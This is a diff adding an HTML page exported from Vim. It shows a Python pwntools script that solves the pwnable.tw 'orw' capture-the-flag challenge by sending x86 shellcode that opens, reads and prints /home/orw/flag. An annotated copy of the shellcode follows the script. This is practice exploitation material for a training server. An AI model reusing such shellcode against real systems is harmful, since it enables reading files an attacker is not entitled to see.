@@ -1,0 +1,100 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>~/CFT/pwnable.tw/2_orw/orw.py.html</title>
+<meta name="Generator" content="Vim/8.1">
+<meta name="plugin-version" content="vim7.4_v2">
+<meta name="syntax" content="python">
+<meta name="settings" content="use_css,pre_wrap,no_foldcolumn,expand_tabs,prevent_copy=">
+<meta name="colorscheme" content="none">
+<meta name="keywords" content="pwnable.tw assembly syscall" />
+<style type="text/css">
+<!--
+pre { white-space: pre-wrap; font-family: monospace; color: #ffffff; background-color: #000000; }
+body { font-family: monospace; color: #ffffff; background-color: #000000; }
+* { font-size: 1em; }
+.PreProc { color: #5fd7ff; }
+.Comment { color: #00ffff; }
+.Constant { color: #ff40ff; }
+.Identifier { color: #00ffff; font-weight: bold; }
+-->
+</style>
+
+<script type='text/javascript'>
+<!--
+
+-->
+</script>
+</head>
+<body>
+<pre id='vimCodeElement'>
+<span class="Comment">#!/usr/bin/env python</span>
+
+<span class="PreProc">from</span> pwn <span class="PreProc">import</span> *
+
+p = remote(<span class="Constant">'</span><span class="Constant">chall.pwnable.tw</span><span class="Constant">'</span>, <span class="Constant">10001</span>)
+
+<span class="Identifier">print</span> p.recv()
+
+sc = <span class="Constant">'''</span>
+<span class="Constant">sub dword ptr [esp], 0x30</span>
+<span class="Constant">push 0x00006761</span>
+<span class="Constant">push 0x6c662f77</span>
+<span class="Constant">push 0x726f2f65</span>
+<span class="Constant">push 0x6d6f682f</span>
+<span class="Constant">mov eax, 5</span>
+<span class="Constant">mov ebx, esp</span>
+<span class="Constant">xor ecx, ecx</span>
+<span class="Constant">xor edx, edx</span>
+<span class="Constant">int 0x80</span>
+<span class="Constant">mov ebx, eax</span>
+<span class="Constant">mov eax, 3</span>
+<span class="Constant">mov ecx, esp </span>
+<span class="Constant">mov edx, 0x30</span>
+<span class="Constant">int 0x80</span>
+<span class="Constant">mov eax, 4</span>
+<span class="Constant">mov ebx, 1</span>
+<span class="Constant">int 0x80</span>
+<span class="Constant">'''</span>
+
+p.sendline(asm(sc))
+<span class="Identifier">print</span> p.recv()
+<span class="Identifier">print</span> <span class="Constant">&quot;</span><span class="Constant">a</span><span class="Constant">&quot;</span>
+<span class="Identifier">print</span> p.recv()
+<span class="Identifier">print</span> <span class="Constant">&quot;</span><span class="Constant">a</span><span class="Constant">&quot;</span>
+<span class="Identifier">print</span> p.recv()
+<span class="Identifier">print</span> <span class="Constant">&quot;</span><span class="Constant">a</span><span class="Constant">&quot;</span>
+
+</pre>
+<pre id='asmcodeelement'>
+<span class="Comment">; open(&quot;/home/orw/flag&quot;, O_RDONLY)</span>
+<span class="Identifier">sub</span> <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>], <span class="Constant">0x30</span> <span class="Comment">; make room on stack</span>
+<span class="Identifier">push</span> <span class="Constant">0x00000000</span> <span class="Comment">; /home/orw/flag</span>
+<span class="Identifier">push</span> <span class="Constant">0x00006761</span>
+<span class="Identifier">push</span> <span class="Constant">0x6c662f77</span>
+<span class="Identifier">push</span> <span class="Constant">0x726f2f65</span>
+<span class="Identifier">push</span> <span class="Constant">0x6d6f682f</span>
+<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Constant">5</span> <span class="Comment">; open syscall nr</span>
+<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Identifier">esp</span> <span class="Comment">; take parameter from starck</span>
+<span class="Identifier">xor</span> <span class="Identifier">ecx</span>, <span class="Identifier">ecx</span> <span class="Comment">; O_RDONLY</span>
+<span class="Identifier">xor</span> <span class="Identifier">edx</span>, <span class="Identifier">edx</span> <span class="Comment">; flags 0</span>
+<span class="Identifier">int</span> <span class="Constant">0x80</span>
+
+<span class="Comment">; read(fd_eax, esp, 10);</span>
+<span class="Comment">;mov edi; eax ; save fd</span>
+<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Identifier">eax</span> <span class="Comment">; fd</span>
+<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Constant">3</span> <span class="Comment">; read syscall nr</span>
+<span class="Comment">; ecx stays the same == esp</span>
+<span class="Identifier">mov</span> <span class="Identifier">ecx</span>, <span class="Identifier">esp</span>
+<span class="Identifier">mov</span> <span class="Identifier">edx</span>, <span class="Constant">0x30</span> <span class="Comment">; read 0x30 bytes</span>
+<span class="Identifier">int</span> <span class="Constant">0x80</span>
+
+<span class="Comment">; write</span>
+<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Constant">4</span> <span class="Comment">; write syscall nr</span>
+<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Constant">1</span> <span class="Comment">; stdout</span>
+<span class="Identifier">int</span> <span class="Constant">0x80</span>
+</pre>
+</body>
+</html>
+<!-- vim: set foldmethod=manual : -->
